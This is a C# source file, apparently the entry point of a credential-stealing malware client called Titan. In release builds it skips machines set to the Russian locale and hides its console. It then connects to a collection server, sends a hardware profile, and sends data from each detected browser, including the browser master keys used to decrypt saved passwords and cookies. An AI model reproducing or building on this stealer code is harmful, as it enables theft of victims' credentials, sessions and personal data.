using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Threading;
using Titan.NF.Client.Browsers;
using Titan.NF.Client.Hardware;
using Titan.NF.Client.Network;

namespace Titan.NF.Client
{
    internal class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern int FreeConsole();

        static void Main(string[] args)
        {
            if(Thread.CurrentThread.CurrentCulture.TwoLetterISOLanguageName == "ru")
            {
#if !DEBUG
                return;
#endif
            }
#if !DEBUG
            FreeConsole();
#endif

#if DEBUG
            Console.WriteLine(HardwareService.GetHardwareId());
#endif

            //
            // Send Hardware Profile
            //

            if (NetworkService.Connect("127.0.0.1", 27140))
            {
                var hardware = HardwareService.CollectHardware();

                List<string> lines = new List<string>();

                foreach (var entry in hardware)
                {
                    foreach (var line in entry)
                    {
                        lines.Add(line);
                    }
                }

                NetworkService.SendHardwareProfile(lines);

                //
                // Send Found Data
                //

                foreach (var browser in BrowsersService.DetectedBrowsers())
                {
                    NetworkService.SendBrowserData(browser);
#if DEBUG
                    Console.WriteLine($" -- Browser: {browser.Tag()} / Key -> {Convert.ToBase64String(browser.MasterKey())}");
                    Console.WriteLine($" -- Extensions: {browser.Extensions().Count}");
#endif              

                    //Dictionary<string, byte[]> masterKeys = browser.MasterKey();
                    //foreach (var key in masterKeys)
                    //{
                    //
                    //    NetworkService.SendBrowserData(browser);
                    //}
                }
            }
            else
            {
                Console.Write("Couldn't connect to the server!");
            }

            Console.ReadLine();
        }
    }
}
